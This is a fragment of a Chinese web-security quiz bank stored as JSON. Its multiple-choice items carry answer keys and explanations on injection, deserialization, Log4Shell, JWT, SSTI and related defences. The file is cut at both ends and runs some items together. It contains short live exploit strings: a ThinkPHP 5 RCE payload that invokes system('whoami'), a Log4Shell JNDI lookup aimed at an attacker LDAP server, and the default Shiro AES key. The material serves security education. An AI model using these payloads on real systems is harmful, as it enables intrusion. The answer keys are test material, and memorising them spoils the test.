）。","o":["JSONP通过script标签回调实现跨域且仅限GET、无权限控制；CORS基于响应头、更安全灵活","JSONP更安全","CORS仅限GET","JSONP支持POST且鉴权完善"],"a":0,"e":"\u003cb>JSONP只能GET、靠script标签+回调函数实现跨域，\u003cb>无法控制谁在调用、支持任意来源（易被数据窃取）\u003c/b>；CORS由服务端通过响应头\u003cb>显式控制允许的来源\u003c/b>，更安全\u003c/b>。\u003cb>易错点\u003c/b>：'新系统用CORS，别用JSONP裸奔'。\u003cb>记忆\u003c/b>：'JSONP=老办法敞开跨域，CORS=带白名单'。"},{"c":"web","t":"s","q":"业务逻辑漏洞（如支付金额篡改、优惠券重放、越权改单）的常见成因是（　）。","o":["服务端未对业务流程与关键参数（金额/数量/状态）做完整性校验与幂等控制","服务器带宽不足","数据库太大","前端代码冗余"],"a":0,"e":"\u003cb>逻辑漏洞：\u003cb>服务端信任了客户端提交的关键数据\u003c/b>（如金额）、流程状态可被跳过/重放、未做幂等（优惠券重复使用）\u003c/b>。\u003cb>防护\u003c/b>：金额/权限等关键逻辑在\u003cb>服务端\u003c/b>计算与校验、状态机校验、请求幂等与防重放。\u003cb>易错点\u003c/b>：'前端校验是给用户看的，服务端校验才是真的'。\u003cb>记忆\u003c/b>：'关键数据别信客户端，流程要服务端把关'。"},{"c":"web","t":"s","q":"Web缓存投毒（Cache Poisoning）攻击的目标是（　）。","o":["诱导缓存服务器缓存恶意响应，使后续所有用户收到被投毒的内容","直接攻击数据库","爆破用户口令","篡改DNS"],"a":0,"e":"\u003cb>缓存投毒：攻击者利用\u003cb>未键化参数（Unkeyed input）与缓存键解析差异\u003c/b>，让CDN/代理缓存其恶意响应，\u003cb>所有访问者\u003c/b>都被投毒（XSS、钓鱼、恶意脚本）\u003c/b>。\u003cb>防护\u003c/b>：规范缓存键（仅包含安全参数）、缓存头正确配置。\u003cb>易错点\u003c/b>：'一毒全体中招'，威力大。\u003cb>记忆\u003c/b>：'给缓存下毒=一次污染，万人受害'。"},{"c":"web","t":"s","q":"原型污染（Prototype Pollution）漏洞主要影响（　）应用。","o":["JavaScript（Node.js/前端）应用，通过修改Object.prototype污染全局对象导致RCE/逻辑绕过","Java应用","C++程序","数据库"],"a":0,"e":"\u003cb>原型污染：攻击者通过\u003ccode>__proto__\u003c/code>/\u003ccode>constructor.prototype\u003c/code>等属性修改\u003cb>JavaScript原型对象\u003c/b>，污染全局，可致\u003cb>属性覆盖、认证绕过、DoS甚至RCE\u003c/b>\u003c/b>。\u003cb>防护\u003c/b>：合并对象时白名单过滤、冻结原型（Object.freeze）、更新依赖。\u003cb>易错点\u003c/b>：'JS专属，靠__proto__下毒'。\u003cb>记忆\u003c/b>：'改了所有对象的'祖宗'，全局遭殃'。"},{"c":"web","t":"s","q":"关于Web安全纵深防御，下列说法正确的是（　）。","o":["安全编码（输入校验/输出编码/参数化）+WAF+日志监控+最小权限多层叠加","只靠WAF","只靠代码","只靠加密"],"a":0,"e":"\u003cb>Web纵深防御=\u003cb>安全开发（源头）→WAF/网关（入口）→运行时防护（RASP）→日志与监控（发现）→应急响应（处置）\u003c/b>多层级叠加，单点失效不致命\u003c/b>。\u003cb>易错点\u003c/b>：'没有任何单点方案能包打天下'。\u003cb>记忆\u003c/b>：'开发、网关、运行时、监控、响应，五层皮'。"},{"c":"web","t":"s","q":"在代码审计/测试中，检测SQL注入、XSS、命令注入等缺陷的自动化工具属于（　）。","o":["SAST（静态应用安全测试）或DAST（动态应用安全测试）","杀毒软件","数据库备份工具","监控告警"],"a":0,"e":"\u003cb>SAST（静态分析，扫源码）、DAST（动态黑盒扫描，如Burp/SQLMap对运行系统测试）、IAST（插桩运行时）是应用安全测试三大类\u003c/b>；DevSecOps中常集成进CI/CD。\u003cb>易错点\u003c/b>：'SAST看代码，DAST打系统'。\u003cb>记忆\u003c/b>：'SAST=读源码找病，DAST=打黑盒找洞'。"},{"c":"web","t":"m","q":"下列属于防范 SQL 注入措施的有（　）。","o":["使用参数化查询（预编译语句）","对用户输入进行过滤与校验","数据库账户使用最小权限","部署 WAF 并及时修补漏洞"],"a":[0,1,2,3],"e":"\u003cb>参数化查询是根治手段\u003c/b>（SQL 语句结构与数据分离，输入无法改变语义）；输入过滤校验、最小权限（即使被注入也限制危害）、WAF 与补丁管理属\u003cb>纵深防御\u003c/b>。根源是拼接 SQL 字符串。"},{"c":"web","t":"m","q":"下列关于 Java 中间件反序列化漏洞的说法，正确的有（　）。","o":["Apache Shiro 早期版本对 rememberMe Cookie 的 AES 加密密钥硬编码在源码中，密钥泄露后可构造反序列化利用链","Fastjson 开启 autoType 时，JSON 中的 @type 字段可指定任意类，配合 JNDI 注入可能导致远程代码执行","反序列化漏洞的本质是不可信数据被还原为对象时触发了危险方法调用","反序列化漏洞只影响 Java，PHP、Python 等语言不存在此类问题"],"a":[0,1,2],"e":"\u003cb>反序列化漏洞三要素：入口（Cookie/参数/消息）、利用链（Gadget）、危险终点（RCE/SSRF）\u003c/b>。Shiro-550 因硬编码 AES 密钥可伪造 rememberMe；Fastjson autoType 允许指定类并触发 setter/getter；\u003cb>PHP 的 unserialize、Python 的 pickle 同样存在反序列化漏洞，并非 Java 独有\u003c/b>。\u003cb>记忆\u003c/b>：'入口进数据，还原即执行，语言不是护身符'。"},{"c":"web","t":"s","q":"Apache Shiro 反序列化漏洞（Shiro-550）的根本原因是（　）。","o":["rememberMe Cookie 的 AES 加密密钥硬编码在源码中且长期未更换","Shiro 使用 HTTP 明文传输","Shiro 不支持 HTTPS","用户密码使用 MD5 存储"],"a":0,"e":"\u003cb>Shiro-550 根因：AES 密钥硬编码（默认 kPH+bIxk5D2deZiIxcaaaA==）\u003c/b>。攻击者用该密钥加密恶意序列化对象写入 rememberMe Cookie，服务端解密后反序列化触发 Gadget 链导致 RCE。\u003cb>易错点\u003c/b>：漏洞在'密钥可知+反序列化'，与传输协议、密码存储方式无关。\u003cb>记忆\u003c/b>：'钥匙写死在源码里，锁就形同虚设'。"},{"c":"web","t":"s","q":"Log4j2 远程代码执行漏洞（Log4Shell，CVE-2021-44228）的利用入口通常是（　）。","o":["日志内容中嵌入 ${jndi:ldap://攻击者服务器/xxx} 形式的表达式","数据库弱口令","SSH 私钥泄露","ARP 欺骗"],"a":0,"e":"\u003cb>Log4j2 会自动解析日志中的 ${...} 表达式\u003c/b>，${jndi:ldap://} 触发 JNDI 查找并从攻击者控制的 LDAP/RMI 服务加载恶意类实现 RCE。任何能进入日志的输入点（登录名、User-Agent、搜索框）都可成为入口。\u003cb>易错点\u003c/b>：漏洞在'日志框架自动求值'，与数据库、系统层无关。\u003cb>记忆\u003c/b>：'打进日志的 ${} 会被当命令执行'。"},{"c":"web","t":"s","q":"关于 Fastjson autoType 反序列化漏洞的修复，最有效的思路是（　）。","o":["升级到安全版本并关闭 autoType 或开启 safeMode","在 WAF 中封禁包含 json 的请求","将应用从 Java 换成其他语言重写","限制上传文件大小"],"a":0,"e":"\u003cb>Fastjson autoType 允许 JSON 指定反序列化目标类，修复以升级版本并关闭 autoType/开启 safeMode 为准\u003c/b>。仅靠 WAF 关键字匹配易被 Unicode 编码、注释等变形绕过；换语言与限制上传和本漏洞无关。\u003cb>易错点\u003c/b>：组件漏洞优先'升级/配置消除'，WAF 只是临时缓解。\u003cb>记忆\u003c/b>：'组件漏洞升级治本，WAF 治标'。"},{"c":"web","t":"s","q":"某电商系统用户将请求中的订单号 id=1001 改为 id=1002 后，成功查看到他人订单详情。该漏洞属于（　）。","o":["水平越权（IDOR）","垂直越权","SQL 注入","CSRF"],"a":0,"e":"\u003cb>水平越权：同权限用户之间越权访问他人资源，典型即 IDOR（不安全的直接对象引用）\u003c/b>——后端未校验资源归属，仅凭前端传入的 ID 就返回数据。垂直越权是\u003cb>低权限用户获得高权限功能\u003c/b>（如普通用户访问管理接口）；本题请求语义无 SQL 结构变化，也无跨站伪造。\u003cb>修复\u003c/b>：服务端校验资源归属（订单是否属于当前会话用户）。\u003cb>记忆\u003c/b>：'改 ID 看别人的=水平，普通人进后台=垂直'。"},{"c":"web","t":"m","q":"关于业务逻辑漏洞，下列说法正确的有（　）。","o":["典型场景包括支付金额篡改、验证码绕过或重放、优惠券重复使用、短信接口轰炸","逻辑漏洞难以靠通用 WAF 规则完全拦截，需要在业务设计层增加校验","竞争条件（并发请求）可能绕过余额校验，导致超额提现","只要对所有输入做 HTML 转义即可杜绝逻辑漏洞"],"a":[0,1,2],"e":"\u003cb>逻辑漏洞是'业务规则被滥用'，输入完全合法但语义违规\u003c/b>，WAF 难以用通用规则识别，需靠服务端状态机、幂等设计、金额后端重算、验证码一次性等手段对抗；并发竞争需加锁防重。HTML 转义防的是 XSS，\u003cb>对逻辑漏洞无效\u003c/b>。\u003cb>记忆\u003c/b>：'逻辑漏洞防在流程里，不在转义里'。"},{"c":"web","t":"s","q":"渗透测试中发现某站点的 Tomcat Manager（/manager/html）使用弱口令 tomcat:tomcat，最可能导致的直接后果是（　）。","o":["通过部署包含 WebShell 的 WAR 包获得服务器控制权","数据库表结构自动泄露","交换机配置被导出","DNS 记录被篡改"],"a":0,"e":"\u003cb>Tomcat Manager 支持上传部署 WAR 包\u003c/b>，拿到弱口令即可部署含 JSP WebShell 的应用，直接获得服务器控制权。\u003cb>加固\u003c/b>：强口令、限制来源 IP、非必要关闭 Manager、最小化角色授权。\u003cb>易错点\u003c/b>：与数据库、网络设备、DNS 无直接关系，不要选扩大化。\u003cb>记忆\u003c/b>：'Manager 弱口令 = 送一个 WAR 后门位'。"},{"c":"web","t":"m","q":"下列属于 Web 中间件安全加固措施的有（　）。","o":["及时升级中间件版本，订阅官方安全通告","删除或关闭默认示例应用、文档与管理后台（或强口令并限制访问来源）","以非特权账户运行中间件，最小化文件系统写权限","以 root 或 SYSTEM 身份运行中间件，便于排错"],"a":[0,1,2],"e":"\u003cb>中间件加固三板斧：打补丁、收敛暴露面（示例应用/管理后台）、最小权限运行\u003c/b>。以 root/SYSTEM 运行会使 WebShell 直接获得系统最高权限，\u003cb>违反最小特权原则\u003c/b>，属错误做法。\u003cb>记忆\u003c/b>：'打补丁、关后台、降权限'。"},{"c":"web","t":"s","q":"在MySQL中，以下哪种注入方式适用于目标页面无回显但通过页面状态（TRUE/FALSE）判断注入是否成立？","o":["联合注入","报错注入","布尔盲注","时间盲注"],"a":2,"e":"布尔盲注适用于无回显但有布尔差异（TRUE显示正常内容，FALSE显示不同内容）的场景，通过构建真/假条件逐步推断数据。"},{"c":"web","t":"s","q":"SQL注入中，\"延时盲注\"判断注入是否成功的依据是？","o":[ 漏洞（AutoType开启时）的核心问题是？","o":["攻击者通过@type字段指定任意类，触发其反序列化时的恶意代码执行","Fastjson对JSON中字符串未做XSS过滤","Fastjson的URL字段未做SSRF过滤","Fastjson存在SQL注入漏洞"],"a":0,"e":"Fastjson在反序列化时支持@type指定任意Java类，通过构造恶意类（如com.sun.rowset.JdbcRowSetImpl）在反序列化时自动调用getter/setter，触发JNDI查询实现RCE。"},{"c":"web","t":"s","q":"\"Shiro-550\"（CVE-2016-4437）与\"Shiro-721\"的区别是？","o":["Shiro-550密钥硬编码可解，Shiro-721需要Padding Oracle攻击才能解","两者都是反序列化漏洞，只是CVE编号不同","Shiro-550影响所有版本，Shiro-721只影响1.2.x","Shiro-550使用AES CBC，Shiro-721使用AES GCM"],"a":0,"e":"Shiro-550：AES密钥已知，可直接伪造rememberMe Cookie；Shiro-721：密钥未知但可利用Padding Oracle攻击逐步解密，需要知道合法Cookie并有足够的请求次数。"},{"c":"web","t":"s","q":"ThinkPHP5远程代码执行漏洞（ThinkPHP 5.0.x RCE）的典型利用方式是？","o":["构造?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami","使用UNION SELECT注入读取配置文件","上传包含恶意PHP代码的图片文件","利用XML外部实体读取敏感文件"],"a":0,"e":"ThinkPHP5的路由解析漏洞可通过构造URL: ?s=index/\\think\\container/\\__constructor 或 \\think\\app/invokefunction调用任意函数执行命令。"},{"c":"web","t":"s","q":"GraphQL中，以下哪种操作可以绕过字段级权限控制？","o":["通过__schema查询获取所有可用字段，直接请求未做权限控制的字段","使用Introspection查询","使用query变体","使用mutation插入数据"],"a":0,"e":"GraphQL权限控制依赖 resolver 实现，若未对每个字段单独做权限检查，可通过 Introspection 了解数据结构后直接请求未过滤的敏感字段（如user { password }）。"},{"c":"web","t":"s","q":"API安全中\"BOLA\"（失效的对象级授权）与\"IDOR\"的关系是？","o":["BOLA是IDOR的OWASP官方名称，本质相同","BOLA专指GraphQL API，IDOR专指REST API","IDOR是水平越权，BOLA是垂直越权","两者没有关联，是完全独立的漏洞类型"],"a":0,"e":"BOLA（Broken Object Level Authorization）是API5:2021的OWASP名称，与IDOR（Insecure Direct Object Reference）指同一类问题：对象访问控制失效，用户可通过修改ID直接访问他人对象。"},{"c":"web","t":"s","q":"REST API中，以下哪种HTTP方法通常用于更新资源的部分字段？","o":["PATCH","PUT","POST","DELETE"],"a":0,"e":"PATCH用于更新资源的部分字段（增量更新），PUT用于完整替换资源；POST通常用于创建资源；DELETE删除资源。API安全中PATCH若未做字段级权限校验，可能导致越权修改他人资源。"},{"c":"web","t":"s","q":"\"内容安全策略\"（CSP）的report-uri指令作用是？","o":["当CSP策略被触发时，向指定URL发送违规报告","记录所有用户的访问日志","报告XSS攻击尝试","向浏览器发送安全策略配置"],"a":0,"e":"Content-Security-Policy-Report-Only配合report-uri https://example.com/csp-report，当页面违反CSP策略时，浏览器向指定URI发送JSON格式的违规报告（不阻止执行）。"},{"c":"web","t":"s","q":"X-Frame-Options响应头的DENY值与SAMEORIGIN值的区别是？","o":["DENY完全禁止任何页面嵌套，SAMEORIGIN仅允许同源页面嵌套","DENY允许同源页面嵌套，SAMEORIGIN允许任何页面嵌套","两者完全相同，只是兼容不同浏览器","DENY需要额外配置Token才能生效"],"a":0,"e":"X-Frame-Options: DENY = 禁止所有页面（包括同源）通过iframe/embed/object嵌套；SAMEORIGIN = 仅禁止其他源的页面嵌套，同源页面可正常嵌套。点击劫持防御优先选DENY。"},{"c":"web","t":"s","q":"JWT中，\"JWK\"（JSON Web Key）的安全作用是？","o":["提供公钥供验证Token签名使用，防止密钥混淆攻击","用于加密Token内容","用于存储用户Session数据","用于Token的过期时间设置"],"a":0,"e":"JWK（JSON Web Key）以JSON格式提供公钥，验证方使用JWK中的公钥验证Token签名；JWK与JWS/JWE配合使用，可防止攻击者用自己的密钥伪造Token（Algorithm Confusion的防护）。"},{"c":"web","t":"s","q":"JWT\"算法混淆\"（Algorithm Confusion）攻击成功的前提条件是？","o":["目标服务器接受\"none\"算法或使用对称密钥验证非对称签名","目标使用HTTPS加密传输","JWT的secret字段为空","用户访问攻击者的钓鱼网站"],"a":0,"e":"攻击者将JWT的alg改为HS256（使用对称密钥）并用自己知道的密钥重新签名，如果服务器用公钥（RS256，公钥）验证HS256（对称密钥）签名的Token，则会误用攻击者提供的密钥验证通过。"},{"c":"web","t":"s","q":"SSTI（服务端模板注入）的危害大于普通XSS的原因是？","o":["SSTI可直接执行任意代码/RCE，XSS只能在前端执行JavaScript","SSTI不需要用户交互，XSS需要诱导用户访问特定页面","SSTI可以读取数据库数据","SSTI可以窃取Cookie，XSS不能"],"a":0,"e":"XSS是客户端执行JavaScript，SSTI是服务端执行任意代码（eval/RCE），可直接getshell、读取服务器敏感文件、执行系统命令，危害远超XSS。"},{"c":"web","t":"s","q":"Jinja2（SSTI）利用中，{{config}}可读取哪些敏感信息？","o":["Flask的SECRET_KEY、所有已加载的配置变量、数据库连接字符串","仅能读取当前用户输入的内容","仅能读取模板文件名","仅能读取路由配置"],"a":0,"e":"{{config}}在Flask/Jinja2中对应app.config或flask.g对象，可访问SECRET_KEY（用于签名Session）、DEBUG模式、数据库连接字符串等所有配置敏感信息。"},{"c":"web","t":"s","q":"\"开放重定向\"（Open Redirect）漏洞的直接危害是？","o":["将用户重定向到钓鱼页面，冒充合法网站骗取敏感信息","在目标网站上执行任意JavaScript代码","读取目标服务器的任意文件","在目标服务器上执行系统命令"],"a":0,"e":"Open Redirect本身不直接执行代码，但可将用户从合法站点重定向到钓鱼页面，结合社会工程学可骗取用户名密码、支付信息等；也常用于绕过白名单限制的链接跳转。"},{"c":"web","t":"s","q":"HTTP请求走私（HTTP Request Smuggling）的根本原因是？","o":["前端服务器与后端服务器对HTTP请求边界的解析不一致","前端服务器没有安装SSL证书","后端服务器使用了HTTP/2协议","浏览器发送的请求格式不规范"],"a":0,"e":"当前端（CDN/WAF/负载均衡）使用一种方式解析请求边界（如Content-Length），而后端使用另一种方式（如Transfer-Encoding）时，攻击者可构造特殊请求逃避前端检测但在后端被解释为多个请求，实现走私。"},{"c":"web","t":"s","q":"原型链污染（Prototype Pollution）漏洞的典型影响是？","o":["污染JavaScript对象的原型，导致所有实例 od_php把PHP作为Apache模块运行（php_value配置生效）；Nginx通常配合php-fpm（FastCGI进程管理器），通过fastcgi_pass转发PHP请求到php-fpm处理，性能和隔离性更好。"},{"c":"web","t":"s","q":"WebLogic Server（CVE-2018-2628等反序列化漏洞）的核心安全问题是？","o":["T3/IIOP协议默认开启且未对序列化数据做签名验证","WebLogic使用HTTP Basic认证且密码默认空","WebLogic的WLDF组件存在任意文件读取","WebLogic的管理端口4443存在未授权访问"],"a":0,"e":"WebLogic的T3协议（Java消息服务）和IIOP协议支持序列化Java对象传输，默认开启且无签名验证，攻击者可发送恶意序列化 payload 实现RCE（类似JRMPListener攻击链）。"},{"c":"web","t":"s","q":"IIS短文件名（Short Filename）枚举漏洞的利用条件是？","o":["目标使用IIS 6.0-10且未安装相关补丁","目标开启HTTP Basic认证","目标使用Windows Server 2019","目标开启WebDAV"],"a":0,"e":"IIS短文件名（8.3格式）在IIS 6.0-10存在枚举漏洞，通过发送特定构造的请求可枚举文件/目录的短文件名（~1xxxxx），用于猜解备份文件、敏感文件路径等。"},{"c":"web","t":"s","q":"PHP-FPM（CGI模式）存在远程代码执行漏洞（CVE-2019-11043）的触发条件是？","o":["Nginx配置fastcgi_split_path_info匹配到包含路径的URL且PHP-FPM版本存在漏洞","PHP-FPM配置max_children限制过低","PHP-FPM使用Unix Socket而非TCP连接","Nginx启用gzip压缩"],"a":0,"e":"CVE-2019-11043：当Nginx配置fastcgi_split_path_info使用路径分割（如fastcgi_split_path_info ^/app/(.+?.php)(/.*)?$;），攻击者发送带特定环境的请求可触发缓冲区溢出RCE。"},{"c":"web","t":"m","q":"以下哪些措施能有效防御SQL注入？（多选）","o":["使用预编译语句（Prepared Statements + Parameterized Queries）","对用户输入进行严格的白名单验证","在应用层和网络层同时部署WAF","使用ORM框架但仍拼接用户输入"],"a":[0,1,2],"e":"预编译是最有效的根本性防御；白名单验证配合使用；WAF提供纵深防护；ORM拼接用户输入（如Hibernate的createQuery）仍存在注入风险，不是有效防御。"},{"c":"web","t":"m","q":"以下哪些是JWT的安全最佳实践？（多选）","o":["使用RS256（RSA签名）而非HS256（对称签名）","在服务端维护Token黑名单（注销Token）","Token中存储敏感信息（如密码）","设置合理的Token过期时间（不能永不过期）"],"a":[0,1,3],"e":"RS256用私钥签名公钥验签防算法混淆；Token黑名单（Redis）实现注销功能；敏感信息不应存放在Token中（Base64可解码）；过期时间需合理设置，配合refresh_token机制。"},{"c":"web","t":"m","q":"以下哪些措施可以有效防御SSRF漏洞？（多选）","o":["对用户输入的URL/域名进行黑名单过滤","限制请求目标为内网IP段（如10.0.0.0/8、192.168.0.0/16）","使用DNS rebinding防护（如强制解析到指定IP）","允许用户通过URL参数访问任意外部URL"],"a":[0,1,2],"e":"黑名单过滤内网地址可部分防御但易被绕过（如localhost、IPv6）；限制IP段是有效手段；DNS rebinding防护强制验证解析结果；允许任意URL访问是SSRF的根本原因。"},{"c":"web","t":"m","q":"以下哪些HTTP安全响应头能有效防止点击劫持（Clickjacking）？（多选）","o":["X-Frame-Options: DENY","Content-Security-Policy: frame-ancestors none","X-Frame-Options:
